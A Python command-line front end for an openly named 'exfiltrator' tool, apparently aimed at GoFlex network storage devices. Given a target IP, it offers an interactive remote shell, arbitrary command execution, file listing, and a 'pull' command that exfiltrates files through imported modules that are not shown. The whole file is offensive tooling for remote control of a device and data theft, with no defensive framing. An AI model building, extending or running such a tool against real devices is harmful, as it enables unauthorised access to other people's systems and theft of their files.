"""
CLI interface for the exfiltrator.
"""

import typer

from goflex_shell.command_executor import CommandExecutor
from goflex_shell.interactive_shell import InteractiveShell
from wrappers.exfiltrate_file import ExfiltrateFiles
from wrappers.list_files import ListFiles

cli = typer.Typer()


# noinspection PyUnusedFunction
@cli.command()
def shell(ip: str) -> None:
    try:
        InteractiveShell.interactive(ip)
    except Exception as exception:
        print(exception)


# noinspection PyUnusedFunction
@cli.command()
def execute(ip: str, command: str) -> None:
    try:
        print(CommandExecutor.execute(ip, command).decode())
    except Exception as exception:
        print(exception)


# noinspection PyUnusedFunction
@cli.command()
def ls(ip: str, path: str) -> None:
    try:
        print("\n".join(ListFiles(ip).execute(path)))
    except Exception as exception:
        print(exception)


# noinspection PyUnusedFunction
@cli.command()
def pull(ip: str, path: str) -> None:
    try:
        ExfiltrateFiles(ip).execute(path)
    except Exception as exception:
        print(exception)


if __name__ == '__main__':
    cli()
